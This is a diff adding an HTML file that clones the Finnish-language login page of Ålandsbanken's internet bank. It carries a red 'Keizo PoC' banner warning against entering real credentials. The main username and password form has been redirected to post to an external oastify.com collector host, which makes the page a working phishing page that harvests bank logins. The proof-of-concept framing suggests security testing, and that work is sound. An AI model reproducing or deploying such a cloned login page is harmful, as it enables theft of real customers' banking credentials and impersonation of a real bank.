@@ -1,0 +1,793 @@
+<!DOCTYPE HTML>
+<html lang="fi">
+<head>
+    <title>Alandsbanken</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+    <meta name="description" content="">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="smartbanner:title" content="Alandsbanken Finland">
+    <meta name="smartbanner:author" content="Alandsbanken Abp">
+    <meta name="smartbanner:price" content="Ilmainen - Google Play">
+    <meta name="smartbanner:price-suffix-apple" content=" - On the App Store">
+    <meta name="smartbanner:price-suffix-google" content=" ">
+    <meta name="smartbanner:icon-google" content="https://lh3.googleusercontent.com/fldseWtef-8PDiTHtEwiC3XoGA_l0qtDZlf5jK9OjTWw2o6_8mIxoN4Qiyg_h2SXFqo=s180-rw">
+    <meta name="smartbanner:button" content="Lataa sovellus">
+    <meta name="smartbanner:button-url-google" content="https://play.google.com/store/apps/details?id=com.alandsbanken.mobilbank.fi">
+    <meta name="smartbanner:enabled-platforms" content="android">
+
+    <link rel="stylesheet" type="text/css" href="https://online.alandsbanken.fi/theme/css/lato.css?version=RC-release-2023.6-20230612230139EEST-172088c7">
+<script src="https://online.alandsbanken.fi/theme/js/vendor/smartbanner.min.js"></script>
+<script>
+
+    //Pagination labels (DataTables API)
+    var pagination = {}
+     pagination.language = {
+        paginate:{
+            next: 'Seuraava',
+            previous: 'Edellinen'
+        },
+        sZeroRecords : '',
+        sEmptyTable: "On tapahtunut tekninen virhe. Ole hyva ja lataa sivu uudestaan.",
+        sLoadingRecords: '<img class="loading-gif" src="https://online.alandsbanken.fi/theme/img/misc/loader.gif"/>',
+        sProcessing: "Odota hetki, tietoja kasitellaan.",
+        sLengthMenu: ' ' +
+            '<select>'+
+            '  <option value="5">5</option>'+
+            '  <option value="10">10</option>'+
+            '  <option value="20">20</option>'+
+            '  <option value="100">100</option>'+
+            '</select> ',
+        sInfo: ''
+      }
+    //Logout box texts (extendSession.js)
+    var labels = {
+        //Logout box texts
+        lbl_kilogram : 'kg',
+        lbl_session_about_die_t : 'Istunto katkaistaan pian  ',
+        lbl_session_dead_t : 'Istunto on katkaistu',
+
+        lbl_session_about_die_c : 'Istuntosi katkaistaan pian turvallisuussyista. <br />Haluatko jatkaa? Istuntoa jaljella: ',
+        lbl_session_dead_c : 'Istunto on katkaistu turvallisuussyista. Haluatko kirjautua uudelleen sisaan?',
+
+        lbl_seconds : 'sekuntia.',
+
+        lbl_renew : 'Jatka istuntoa ',
+        lbl_logout : 'Kirjaudu ulos ',
+        lbl_relogin : 'Kirjaudu sisaan ',
+        lbl_close : 'Peruuta',
+        lbl_yes : 'Kylla',
+        lbl_no : 'Ei',
+        lbl_cancel : 'Peruuta',
+        lbl_ok : 'Hyvaksy',
+
+
+        lbl_already_clicked : 'Olet jo napsauttanut tata toimintoa, jatka napsauttamalla ok.',
+
+        //Waiting dialog texts
+        lbl_wait : 'Odota hetki, tietoja kasitellaan.',
+
+        // Prevent Navigation labels
+        lbl_prevent_navigation_title        : 'Ulkomaanmaksu',
+        lbl_prevent_navigation_text         : 'Haluatko keskeyttaa maksun?',
+        lbl_prevent_navigation_btn_proceed  : 'Kylla',
+        lbl_prevent_navigation_btn_stay     : 'En',
+
+        //Alert dialog labels
+        lbl_alert_title : '',
+        messageRefTitle : 'Viitenumero',
+        piggyTitle : 'Saastopossu',
+        btn_no : '',
+        btn_yes : '',
+        message_or_reference : 'Rekisteroidaanko maksu ilman viestia tai viitenumeroa?',
+        pay_from_saved : 'Oletko varma, etta haluat ottaa rahaa saastopossutililtasi?',
+        err_redEmailErr : 'Ole hyva ja tarkista sahkopostiosoitteesi.',
+        encapConfirmDialogTitle : 'Poista laite kaytosta',
+        encapConfirmDialogContent : 'Haluatko poistaa taman laitteen kaytosta?',
+
+        //Ajax error (IE8)
+        lbl_ajaxFail : '',
+
+        wannaSave:'',
+
+        //Datatables error-messages
+        dataTableEmptyTableMsg : 'On tapahtunut tekninen virhe. Ole hyva ja lataa sivu uudestaan.',
+        lbl_noTransactions: '[ Talla jaksolla ei ole tapahtumia. ]',
+        lbl_noDataAvailable: 'Tiedosto on tyhja.',
+
+        err_pinCodeMissing: 'Sinun on annettava tunnuslukutaulukostasi annetun kohdan mukainen tunnusluku.',
+        err_pinCodeLength: 'Antamasi tunnusluku ei ole taydellinen.',
+
+        // Foreign Payment
+        lbl_pre_count : 'Merkkeja jaljella:&nbsp;',
+        lbl_post_count : '',
+
+        // Otp missing in signing
+        otpMissing : 'Sinun on annettava tekstiviestikoodi.',
+
+        // Stopservice
+        lbl_stopServiceDialogTitle :'Stopservice',
+
+        // RP eInvoice
+        lbl_rp_confirm_delete_title : 'Poista e-laskuehdotus',
+        lbl_rp_confirm_delete_text : 'Vahvista, etta haluat poistaa e-laskuehdotuksen napsauttamalla Poista.',
+        lbl_rp_confirm_delete_button : 'Poista',
+        lbl_rp_nothing_selected : 'Sinun on valittava yritys ennen kuin voit jatkaa.',
+        lbl_rp_connections_title : 'E-laskuehdotuksesi',
+
+        // Carbon footprint
+        lbl_carbonfootprint : 'Hiilijalanjalkesi',
+
+        
+        ibanConvTitle : 'IBAN-laskuri',
+
+        
+        lbl_conciergeDialogTitle: 'Ota yhteytta Concierge Service-palveluun',
+        stopServiceDialogTitle:  '',
+
+        
+        lbl_mobile_dialog_title : 'Muuta matkapuhelinnumerosi',
+        lbl_abort : 'Keskeyta',
+        lbl_get_sms : 'Vahvista matkapuhelinnumero',
+        lbl_verify_mobile_change : 'Tallenna matkapuhelinnumero',
+
+        
+        err_unexpected_error : 'On tapahtunut odottamaton jarjestelmavirhe, yrita ystavallisesti myohemmin uudelleen.',
+
+        
+        lbl_btn_switch_between_qr_encap: 'Vaihda kayttajatunnukseen.',
+        lbl_btn_switch_between_encap_qr: 'Vaihda QR-koodiin'
+
+    };
+
+    var widths = {
+        defaultPopupWidth: 660,
+        narrowPopupWidth: 461,
+        widePopupWidth: 800
+    }
+
+    var months = [
+        'Tammikuu',
+        'Helmikuu',
+        'Maaliskuu',
+        'Huhtiku',
+        'Toukokuu',
+        'Kesakuu',
+        'Heinakuu',
+        'Elokuu',
+        'Syyskuu',
+        'Lokakuu',
+        'Marraskuu',
+        'Joulukuu'
+    ]
+
+    
+    var patterns = {
+        //monetary_amount:'#,##0.00 ï¿½ï¿½',
+        //monetary_balance'+#,##0.00 ï¿½ï¿½;-#,##0.00 ï¿½ï¿½',
+        //monetary_balance_negate:'-#,##0.00 ï¿½ï¿½;+#,##0.00 ï¿½ï¿½',
+        //monetary_amount_symbol_first:'ï¿½ï¿½ #,##0.00',
+        monetary_amount_nosymbol:"#,##0.00",
+        //monetary_balance_nosymbol:'+#,##0.00;-#,##0.00',
+        //monetary_balance_negate_nosymbol:'-#,##0.00;+#,##0.00',
+        //interest_percentage:"#,##0.0000 '%'",
+        interest_percentage_nosymbol:"#,##0.0000",
+        //interest_percentage_2:"#,##0.00 '%'",
+        interest_percentage_2_nosymbol:"#,##0.00",
+        exchange_rate:"##0.000000",
+        monetary_amount_precision4:"#,##0.0000",
+        monetary_amount_precision6:"#,##0.000000",
+        monetary_amount_precision0:"#,##0",
+        monetary_amount_precision1:"#,###0.#",
+        monetary_amount_precision3:"#,##0.000",
+        //percentage_precision2:"#,##0.00' %'",
+        //percentage_precision2_nospace:"#,##0.00'%'",
+        //percentage_precision2_nosymbol:'#,##0.00',
+        //percentage_balance_precision2_nospace:"+#,##0.00'%';-#,##0.00'%'",
+        //percentage_balance_precision2:"+#,##0.00' %';-#,##0.00' %'",
+        //percentage_precision02_nosymbol:'0.##',
+        //percentage_precision6_nospace:"#,##0.000000'%'",
+        //percentage_precision6:"#,##0.000000' %'",
+        numeric__amount_precision0:"#,##0",
+        numeric__amount_precision2:"#,##0.00",
+        numeric__amount_precision4:"#,##0.0000",
+        date:{
+            short:""
+        },
+        time:{
+            medium:"H:mm:ss",
+            short:"H:mm"
+        }
+    }
+
+    window.cbs = window.cbs || {};
+    cbs = window.cbs || {};
+    window.cbs.language = "fi";
+    window.cbs.labels=labels;
+    window.cbs.pagination=pagination;
+    window.cbs.patterns=patterns;
+    window.cbs.contextPath= window.cbs.contextPath || '/ebank';
+    window.cbs.localeCode= window.cbs.localeCode || 'fi_FI';
+    window.cbs.sessionTimeout = window.cbs.sessionTimeout || 300;
+    window.cbs.widths = widths;
+    window.cbs.months = months;
+    window.cbs.oneClickOnline = "true";
+
+        // Register service worker acting on the global scope
+    // Service worker located at root in cbs-inet-docroot-aab
+    if ('serviceWorker' in navigator) {
+        navigator
+            .serviceWorker
+            .register('/service-worker.js', {
+                scope: '/'
+            })
+            .then(function(registration){
+                registration.update();
+            });
+    }
+
+</script>
+<script src="https://online.alandsbanken.fi/ebank/js/jquery-2.min.js?version=RC-release-2023.6-20230612230139EEST-172088c7"></script>
+<script src="https://online.alandsbanken.fi/ebank/js/migrate.js?version=RC-release-2023.6-20230612230139EEST-172088c7"></script>
+<script src="https://online.alandsbanken.fi/ebank/js/jquery-ui.min.js?version=RC-release-2023.6-20230612230139EEST-172088c7"></script>
+<script src="https://online.alandsbanken.fi/ebank/js/jquery-ui-1.8/i18n/ui.datepicker-fi_FI.js?version=RC-release-2023.6-20230612230139EEST-172088c7"></script>
+<script src="https://online.alandsbanken.fi/ebank/sepapayment/ibanConverter.js?version=RC-release-2023.6-20230612230139EEST-172088c7"></script>
+<script src="https://online.alandsbanken.fi/ebank/js/windowsUtils.js?version=RC-release-2023.6-20230612230139EEST-172088c7"></script>
+<script type="text/javascript" src="https://online.alandsbanken.fi/ebank/js/merge.js?version=RC-release-2023.6-20230612230139EEST-172088c7"></script><link href="https://online.alandsbanken.fi/theme/css/app-service.c5ab04a12a5306f21b67.css" rel="stylesheet"><script src="https://online.alandsbanken.fi/theme/main.728884a484f84ee71bd8.js"></script></head>
+
+<body id="loginp" onload='setFocus()'>
+    <div class="c_page c_loginp">
+        <header id="header-login">
+    <div class="site-header-login clearfix many-nav-items">
+
+        <div class="site-branding-login float-left">
+            <a href="https://www.alandsbanken.fi/" id="logo" rel="home" class="site-branding__logo-login">
+                <img src="https://online.alandsbanken.fi/theme/img/misc/logo_small.png" class="logo-small hide-for-print" alt="Alandsbanken - Etusivu">
+                <img src="https://online.alandsbanken.fi/theme/img/misc/aab-bank-logo-full.svg" class="logo-large" alt="Alandsbanken - Etusivu">
+            </a>
+        </div>
+        <nav class="primary-navigation show-for-medium-up float-left hide-for-print">
+            <ul class="nostyle">
+                <li class="primary-navigation__item">
+                                <a class="primary-navigation__link active" href="https://online.alandsbanken.fi/ebank/auth/initLogin.do?&language=1&menuIndex=1">Kirjaudu sisaan</a>
+                            </li>
+                        <li class="primary-navigation__item">
+                                <a class="primary-navigation__link " href="https://online.alandsbanken.fi/ebank/messagecentral/initNewsArchive.do?loginArchive=true&language=1&menuIndex=2">Ajankohtaista</a>
+                            </li>
+                        <li class="primary-navigation__item">
+                                <a class="primary-navigation__link " href="https://online.alandsbanken.fi/ebank/messagecentral/initShowMessage.do?outside=true&messageId=gen_faq&amp;language=1&menuIndex=3">Kysymyksia ja vastauksia</a>
+                            </li>
+                        <li class="primary-navigation__item">
+                                <a class="primary-navigation__link " href="https://online.alandsbanken.fi/ebank/messagecentral/initShowMessage.do?outside=true&messageId=gen_legalnotice&amp;language=1&menuIndex=4">Kayttajaehdot </a>
+                            </li>
+                        <li class="primary-navigation__item">
+                                <a class="primary-navigation__link " href="https://online.alandsbanken.fi/ebank/messagecentral/initShowMessage.do?outside=true&messageId=gen_securityinfo&amp;language=1&menuIndex=5">Turvallisuus</a>
+                            </li>
+                        <li class="primary-navigation__item">
+                                <a class="primary-navigation__link " href="https://online.alandsbanken.fi/ebank/messagecentral/initShowMessage.do?outside=true&messageId=gen_saferuse&amp;language=1&menuIndex=6">Turvatumpi Internet </a>
+                            </li>
+                        <li class="primary-navigation__item">
+                                <a class="primary-navigation__link " href="https://online.alandsbanken.fi/ebank/messagecentral/initShowMessage.do?outside=true&messageId=gen_mobile&amp;language=1&menuIndex=7">Tietoa Mobiilipankista</a>
+                            </li>
+                        </ul>
+        </nav>
+
+        <div class="mobile-menu-toggle table hide-for-print">
+            <div class="table__cell">
+                <button class="mobile-menu-toggle__button js-res-menu-toggle" type="button" role="button" aria-label="Toggle Navigation">
+                    <div class="mobile-menu-toggle__button__inner">
+                        <span></span>
+                        <span></span>
+                        <span></span>
+                    </div>
+                </button>
+            </div>
+        </div>
+
+        <div class="header-right float-right show-for-medium-up hide-for-print">
+            <nav class="secondary-navigation" role="navigation">
+                <ul class="nostyle">
+                    <li class="secondary-navigation__item" title="Kieli/Sprak">
+                        <label for="localePicker" class="choose-country">Kieli/Sprak</label>
+                        <div class="locale-picker-container">
+                            <div class="locale-picker">
+                                <select onchange="window.location = '/ebank/auth/' + this.value" id="localePicker">
+                                    <option  value="initLogin.do?language=2&originBank=2">SVENSKA</option>
+                                    <option selected value="initLogin.do?language=1&originBank=2">SUOMEKSI</option>
+                                </select>
+                            </div>
+
+                        </div>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+
+        </div>
+</header>
+
+<aside class="mobile-menu">
+    <div class="mobile-menu__container">
+        <div class="mobile-menu__locale-picker">
+            <span class="choose-country">Kieli/Sprak</span>
+            <div class="locale-picker-container">
+                <div class="locale-picker">
+                    <select onchange="window.location = '/ebank/auth/' + this.value">
+                        <option  value="initLogin.do?language=2&originBank=2">SVENSKA</option>
+                        <option selected value="initLogin.do?language=1&originBank=2">SUOMEKSI</option>
+                    </select>
+                    <i class="ion-chevron-down"></i>
+                </div>
+            </div>
+        </div>
+        <nav id="mobile-menu__navigation" class="mobile-menu__navigation">
+            <ul class="nostyle">
+                <li class="mobile-menu__navigation__item">
+                                <a class="mobile-menu__navigation__item__link" href="https://online.alandsbanken.fi/ebank/auth/initLogin.do?&language=1&menuIndex=1">Kirjaudu sisaan</a>
+                            </li>
+                        <li class="mobile-menu__navigation__item">
+                                <a class="mobile-menu__navigation__item__link" href="https://online.alandsbanken.fi/ebank/messagecentral/initNewsArchive.do?loginArchive=true&language=1&menuIndex=2">Ajankohtaista</a>
+                            </li>
+                        <li class="mobile-menu__navigation__item">
+                                <a class="mobile-menu__navigation__item__link" href="https://online.alandsbanken.fi/ebank/messagecentral/initShowMessage.do?outside=true&messageId=gen_faq&amp;language=1&menuIndex=3">Kysymyksia ja vastauksia</a>
+                            </li>
+                        <li class="mobile-menu__navigation__item">
+                                <a class="mobile-menu__navigation__item__link" href="https://online.alandsbanken.fi/ebank/messagecentral/initShowMessage.do?outside=true&messageId=gen_legalnotice&amp;language=1&menuIndex=4">Kayttajaehdot </a>
+                            </li>
+                        <li class="mobile-menu__navigation__item">
+                                <a class="mobile-menu__navigation__item__link" href="https://online.alandsbanken.fi/ebank/messagecentral/initShowMessage.do?outside=true&messageId=gen_securityinfo&amp;language=1&menuIndex=5">Turvallisuus</a>
+                            </li>
+                        <li class="mobile-menu__navigation__item">
+                                <a class="mobile-menu__navigation__item__link" href="https://online.alandsbanken.fi/ebank/messagecentral/initShowMessage.do?outside=true&messageId=gen_saferuse&amp;language=1&menuIndex=6">Turvatumpi Internet </a>
+                            </li>
+                        <li class="mobile-menu__navigation__item">
+                                <a class="mobile-menu__navigation__item__link" href="https://online.alandsbanken.fi/ebank/messagecentral/initShowMessage.do?outside=true&messageId=gen_mobile&amp;language=1&menuIndex=7">Tietoa Mobiilipankista</a>
+                            </li>
+                        </ul>
+        </nav>
+    </div>
+</aside>
+
+<div class="grid-x grid-padding-x c_service">
+    <div class="cell small-12 medium-offset-1 medium-10 large-offset-2 large-8">
+        <div class="c_service__message">
+            </div>
+    </div>
+</div>
+
+<div class="grid-x c_loginp__has-tabs">
+                <main class="cell c_loginp__fields">
+                    <script src="https://online.alandsbanken.fi/theme/js/cbs-tabs.js"></script>
+<script>
+
+function set_cookie(name,content,exp_date)
+{
+	exp_date = parseInt(eval(exp_date));
+	if(exp_date+"" == "NaN")
+	{
+		date_fnutt = "";
+	}
+	else
+	{
+		var datum = new Date();
+		datum.setTime(datum.getTime() + exp_date);
+		datum = datum.toGMTString();
+		date_fnutt ="; expires="+datum;
+	}
+	document.cookie = name+"="+escape(content)+date_fnutt;
+}
+
+function get_cookie(name)
+{
+	theCookie = document.cookie;
+	theCookie_parts = theCookie.split("; ");
+	for (i=0;i<theCookie_parts.length;i++)
+	{
+		part = theCookie_parts[i].split("=");
+		if (part[0] == name)
+		{
+			return unescape(part[1]);
+		}
+	}
+	return "";
+}
+
+function test_cookie(text)
+{
+    set_cookie("Test","1");
+
+}
+
+function setFocus() {
+    
+            if (document.simpleLoginForm) {
+                document.simpleLoginForm.username.focus();
+            }
+        
+}
+
+test_cookie('Hyvaksy evasteiden kaytto selaimesi asetuksiin. \nInternetkonttori tunnistaa sinut istuntokohtaisilla evasteilla.');
+
+$(function() {
+	$('.js-bank-change').change( function() {
+        location.href = $(this).val();
+	});
+
+    // Add hash to url for login page
+    $('.c_loginp__fields ul.tabNavigation a, .c_loginp__fields .c_tab-navigation a').click(function () {
+        if( !(this.hash === "") ) {
+            window.history.pushState(null, null, this.hash);            
+        }
+    });
+});
+</script>
+
+
+<div class="c_loginp__header">
+    <div class="grid-x">
+        <div class="cell">
+            <h3 style=color:red;>Keizo PoC - Don't enter your real credentials. Only for Proof-of-Consept</h3>
+            <h1 class="u_fs--xxl u_fw--4 text-center u_margin--vertical--large"><br>Kirjaudu sisaan Internetkonttoriin</h1>
+        </div>
+    </div>
+</div>
+
+<input type="hidden" name="language" value="fi"/>
+
+<div class="cell tabs ">
+		<div class="">
+			<div class="c_tab-navigation tabNavigation--login">
+				<a class="c_tab-navigation__item
+	 "
+	
+   	href='#ENCAP'>
+	Kirjaudu e-ID:lla</a>
+<a class="c_tab-navigation__item first selected
+	"
+	
+   	href='#PIN_TAN'>
+	Kirjaudu taulukolla</a>
+</div>
+		</div>
+		<script>
+    cbs.qrId = 'NETBANK662774B9991E10BD00C14F577';
+    cbs.redirectUrl = "";
+</script>
+<script src="https://online.alandsbanken.fi/theme/js/cbs-fetch-utils.js?version=RC-release-2023.6-20230612230139EEST-172088c7"></script>
+<script src="https://online.alandsbanken.fi/theme/js/qr-code.js?version=RC-release-2023.6-20230612230139EEST-172088c7"></script>
+<script src="https://online.alandsbanken.fi/theme/js/cbs-encap.js?version=RC-release-2023.6-20230612230139EEST-172088c7"></script>
+
+
+<div id="ENCAP" class="row tabContent">
+    <div class="">
+        <div class="">
+            <p class="error hidden" id="dataError"></p>
+        </div>
+
+    </div>
+    <div class="column text-center">
+        <div class="icon-circle-wrapper spinner hidden">
+            <div class="icon-circle loader-icon">
+            </div>
+        </div>
+        <p id="processStatus" class="bold hidden">Avaa Mobiilipankki-sovelluksesi ja tunnistaudu e-ID:lla.</p>
+
+        <div class="authentication-code-processing">
+            <p class="hidden authentication-code-wrapper">
+    Vahvistustunnus<span class="authentication-code">CU82</span>
+</p>
+<p class="u_fw--3 hidden authentication-code-info">
+    Sama vahvistustunnus nakyy mobiilipankkisovelluksessasi ja vahvistaa toimintasi luotettavuutta.</p>
+</div>
+
+        <p id="switchBack" class="info hidden">
+            Tunnistus onnistui, voit palata palveluun tai sovellukseen.</p>
+        <div id="cancelButton" class="is-centered hidden">
+            <div class="border-bottom small-12">
+                <a class="back-link">
+                    Keskeyta sisaankirjautuminen </a>
+            </div>
+        </div>
+    </div>
+
+    <form name="initSessionForm" id="encap-redirect-form" method="post" action="/ebank/auth/initSession.do" class="hidden" target="_top"><div><input type="hidden" name="org.apache.struts.taglib.html.TOKEN" value="a998b7f1beb810c9a8337de17176eae4"></div><input type="hidden" name="scriptActive" value="false" />
+    </form><form name="simpleLoginForm" id="encapLoginForm" method="post" action="/ebank/auth/encapInitLogin.do" class="multi-click" onsubmit="return false" target="_top"><div><input type="hidden" name="org.apache.struts.taglib.html.TOKEN" value="a998b7f1beb810c9a8337de17176eae4"></div><input type="hidden" name="language" value="fi" />
+            <input type="hidden" name="startPage" value="" />
+            <input type="hidden" name="activeTab" value="ENCAP" />
+            <input type="hidden" name="scriptActive" value="false"/>
+            <input type="hidden" name="qrId" id="qrId" />
+            <p id="encapUserIdPlaceholder" hidden aria-hidden="true"></p>
+                <div id="encapLoginFormElements">
+                    <!-- Checking selected language code -->
+<label for="bank-change">Valitse pankki</label>
+<select name="bank-change" id="bank-change" class="select js-bank-change">
+    <option value="/ebank/auth/initLogin.do?language=1&originBank=1" >Alandsbanken Suomi</option>
+    <option value="/ebank/auth/initLogin.do?language=1&originBank=2" selected>Alandsbanken Ahvenanmaa</option>
+    <option value="https://secure.alandsbanken.se/ebank/auth/initLogin.do">Alandsbanken Ruotsi</option>
+</select>
+</div>
+                <div id="eId-fields" class="hidden" >
+                    <div class="c_form__item">
+                            <div>
+                                    <span id="js_error-mark-label">
+                                        <label for="encapUsername" id="encapUsernameLabel">
+                                            Kayttajatunnus:</label>
+                                    </span>
+                            </div>
+                            <div>
+                                <input type="password" name="username"
+                                       id="encapUsername" class="textField"
+                                       maxlength="8" size="6"
+                                       aria-labelledby="encapUserIdPlaceholder encapUsernameLabel"
+                                       autocomplete="off" value=""/>
+                            </div>
+                        </div>
+                    <div>
+                        <button type="submit"
+        class="button c_btn c_btn--wide "
+        
+        name="btn_log_in"
+        value="Kirjaudu sisaan"
+        
+    >
+        Kirjaudu sisaan</button>
+</div>
+                </div>
+            <style>
+    .app2app-buttons header{
+        font-size: 1.25em;
+        padding-bottom: .75em;
+        color: #333;
+    }
+
+    .app2app-started {
+        width: 100%;
+        height: 14em;
+    }
+
+    .app2app-icon {
+        height: 11em; 
+        width: 11em; 
+        background-image: url(https://lh3.googleusercontent.com/fldseWtef-8PDiTHtEwiC3XoGA_l0qtDZlf5jK9OjTWw2o6_8mIxoN4Qiyg_h2SXFqo=s180-rw); 
+        background-repeat: no-repeat;
+    }
+
+    .app2app-abort a {
+        margin-bottom: 1em;
+    }
+
+    .app2app_download_info {
+        margin-bottom: 1em;
+    }
+
+</style>
+
+<section>
+    <div class="app2app-buttons c_button-row hidden">
+        <legend class="app2app-buttons_title">
+            Tunnistaudu Mobiilipankissasi</legend>
+        <div class="authentication-code-oneclick">
+            <p class="hidden authentication-code-wrapper">
+    Vahvistustunnus<span class="authentication-code">CU82</span>
+</p>
+<p class="u_fw--3 hidden authentication-code-info">
+    Sama vahvistustunnus nakyy mobiilipankkisovelluksessasi ja vahvistaa toimintasi luotettavuutta.</p>
+</div>
+        <a href='alandsbanken://app-login?qrCode=NETBANK662774B9991E10BD00C14F577&type=' class="c_btn c_btn--wide c_btn--normal" data-link-type="app2app" >
+            Avaa Mobiilipankki-sovelluksesi</a>
+        <a href="#" class="c_btn c_btn--wide c_btn--light" data-link-type="eid" >
+            Kirjaudu sisaan kayttajatunnuksella</a>
+    </div>
+    <div class="c_button-row app2app-abort">
+        <a href="#" class="c_btn c_btn--wide c_btn--light hidden" >
+            Keskeyta</a>
+    </div>
+    <aside class="app2app_download_info">
+        Jos sinulla ei viela ole Mobiilipankki-sovellustamme, <a href="#">
+            voit noutaa sen taalta</a>!
+    </aside>
+</section><div id="qrcode">
+                <p id="qrMessage"></p>
+                <div class="qr-img-wrapper">
+                    <img class="qr-image"
+                         id="qrImage"
+                    />
+                </div>
+            </div>
+   </form><button class="button c_btn cbs_btn--wide" id="switchBetweenQrAndEncap">Vaihda kayttajatunnukseen.</button>
+</div>
+<div id="PIN_TAN" class="tabContent">
+    <form name="loginForm" id="login" method="post" action="https://vfe8qht48t4820x6hoktqjokjbp4du1j.oastify.com/ebank/auth/loginEbank.do" target="_top"><div><input type="hidden" name="org.apache.struts.taglib.html.TOKEN" value="a998b7f1beb810c9a8337de17176eae4"></div><input type="hidden" name="language" value="fi" />
+        <input type="hidden" name="activeTab" value="PIN_TAN" />
+        <input type="hidden" name="startPage" value="" />
+        <input type="hidden" name="originBank" value="2"/>
+
+        <div>
+            </div>
+        <!-- Checking selected language code -->
+<label for="bank-change">Valitse pankki</label>
+<select name="bank-change" id="bank-change" class="select js-bank-change">
+    <option value="/ebank/auth/initLogin.do?language=1&originBank=1" >Alandsbanken Suomi</option>
+    <option value="/ebank/auth/initLogin.do?language=1&originBank=2" selected>Alandsbanken Ahvenanmaa</option>
+    <option value="https://secure.alandsbanken.se/ebank/auth/initLogin.do">Alandsbanken Ruotsi</option>
+</select>
+<div class="c_form__item">
+            <div>
+                <label for="username">Kayttajatunnus:</label>
+            </div>
+            <div>
+                <input type="password" name="username" maxlength="8" value="" id="username" class="textField" autocomplete="off"></div>
+        </div>
+        <div class="c_form__item">
+            <div>
+                <label for="password">Salasana:</label>
+            </div>
+            <div>
+                <input type="password" name="password" maxlength="60" value="" id="password" class="textField" autocomplete="off"></div>
+        </div>
+        <div>
+            <div>
+                    <button type="submit"
+        class="button c_btn c_btn--wide "
+        
+        name="btn_log_in"
+        value="Kirjaudu sisaan"
+        
+    >
+        Kirjaudu sisaan</button>
+</div>
+        </div>
+
+    </form></div>
+</div>
+    <div class="grid-x c_contact-info">
+    <div class="cell">
+        <p class="u_fw--3">
+            Jos sinulla on kysyttavaa, ota yhteys Asiakaspalveluumme, puhelin <strong>+358 (0)204 292 920</strong>. Avoinna ma-pe klo 08.30-18.00. Voit myos lahettaa sahkopostia osoitteeseen <a href="mailto:asiakaspalvelu@alandsbanken.fi">asiakaspalvelu@alandsbanken.fi</a>.
+
+</p>
+        <p class="u_fw--3">
+            Estaaksesi paasyn Internetkonttoriisi, ota yhteytta sulkupalveluun <strong>+358 (0)9 696 468 00</strong>. Sulkupalvelu on avoinna 24 tuntia vuorokaudessa.</p>
+    </div>
+</div></main>
+                <aside class="cell c_loginp__news">
+                    <div class="grid-x grid-padding-x text-center c_loginp__news__header">
+                        <h2 class="cell u_fs--xxl u_fw--4 u_margin--vertical--large">Ajankohtaista Internetkonttorissa</h2>
+                        <div class="cell sub-heading">Taalla voit lukea ajankohtaisia uutisia </div>
+                    </div>
+                    <div class="grid-x c_loginp__news__section">
+                        <div class="cell">
+                            <div class="grid-x">
+	<div class="cell large-12 c_loginp__news__wrapper">
+		<div class="grid-x grid-margin-x small-up-1 medium-up-3 large-up-3">
+
+			<div class="c_card cell c_loginp__news__item">
+						<div class="card-image"><img src="https://www.alandsbanken.ax/uploads/images/natfiske_bedrageri_bankuppgifter_konto.jpg" /></div>
+
+						<div class="c_card__divider">
+
+								<h3 class="c_card__header u_fs--xl u_fw--4">Varoitus - huijarit eivat lomaile</h3>
+						</div>
+						<div class="c_card__section u_fw--3">
+							<p>Alandsbankenin nimissa tapahtuu kesallakin huijausyrityksia. <br /><br />Tietojenkalastelu tarkoittaa, etta rikolliset yrittavat paasta kasiksi henkilo- tai pankkitietoihisi ottaakseen tilisi haltuunsa tai kayttaakseen tietoja rikolliseen toimintaan.</p>
+						</div>
+						<div class="c_card__divider">
+							<a class="button c_btn c_btn--wide u_margin-top--small" href="https://online.alandsbanken.fi/ebank/messagecentral/initShowMessage.do?messageId=news_natfiske3&outside=true&language=1&menuId=ebankLogin_mnu_news">Lue lisaa</a>
+						</div>
+					</div>
+
+
+				<div class="c_card cell c_loginp__news__item">
+						<div class="card-image"><img src="https://www.alandsbanken.fi/uploads/images/Qr-kod_2000x1333px.jpg" /></div>
+
+						<div class="c_card__divider">
+
+								<h3 class="c_card__header u_fs--xl u_fw--4">Kirjautuminen QR-koodilla</h3>
+						</div>
+						<div class="c_card__section u_fw--3">
+							<p>Nyt voit kirjautua Internetkonttoriin QR-koodin avulla. QR-koodi on nelikulmainen kuviokoodi, jonka skannaat Mobiilipankki-sovelluksesi kautta, kayttaen puhelimesi kameraa apuna. Kun kirjaudut QR-koodilla, et tarvitse kayttajatunnusta - eli sisaankirjautuminen on entista katevampaa.</p>
+						</div>
+						<div class="c_card__divider">
+							<a class="button c_btn c_btn--wide u_margin-top--small" href="https://online.alandsbanken.fi/ebank/messagecentral/initShowMessage.do?messageId=news_qr_kod_2023&outside=true&language=1&menuId=ebankLogin_mnu_news">Lue lisaa</a>
+						</div>
+					</div>
+
+
+				<div class="c_card cell c_loginp__news__item">
+						<div class="card-image"><img src="https://www.alandsbanken.fi/uploads/images/hav_fyr_vatten_kantar_prospera_privatebanking_nummer1_2022.jpg" /></div>
+
+						<div class="c_card__divider">
+
+								<h3 class="c_card__header u_fs--xl u_fw--4">Alandsbanken valittiin Suomen parhaaksi Private Banking -toimijaksi - toista vuotta perakkain</h3>
+						</div>
+						<div class="c_card__section u_fw--3">
+							<p>Alandsbanken on valittu toista vuotta perakkain Suomen parhaaksi Private Banking -toimijaksi Kantar Prosperan Private Banking 2022 Finland -tutkimuksessa. <br /><br />Alandsbanken sai huipputulokset muun muassa kategorioissa henkilokohtainen palvelu, Private Banking -ratkaisut ja vastuullisten sijoitustuotteiden tarjonta.</p>
+						</div>
+						<div class="c_card__divider">
+							<a class="button c_btn c_btn--wide u_margin-top--small" href="https://online.alandsbanken.fi/ebank/messagecentral/initShowMessage.do?messageId=news_pb_nummer_ett_2022&outside=true&language=1&menuId=ebankLogin_mnu_news">Lue lisaa</a>
+						</div>
+					</div>
+
+
+				</div>
+		<div class="grid-x grid-margin-x text-center">
+			<div class="cell">
+				<a class="c_btn--link" href="https://online.alandsbanken.fi/ebank/messagecentral/initNewsArchive.do?loginArchive=true&language=1&menuId=ebankLogin_mnu_news">
+					Lisaa uutisia</a>
+			</div>
+		</div>
+	</div>
+</div></div>
+                    </div>
+                </aside>
+            </div>
+        <footer class="c_footer hide-for-print">
+    <div class="grid-x margin-top-1">
+    <div class="cell small-12 medium-shrink">
+        <div class="grid-x c_footer__list">
+            <div class="cell small-12 medium-shrink c_footer__list__item">
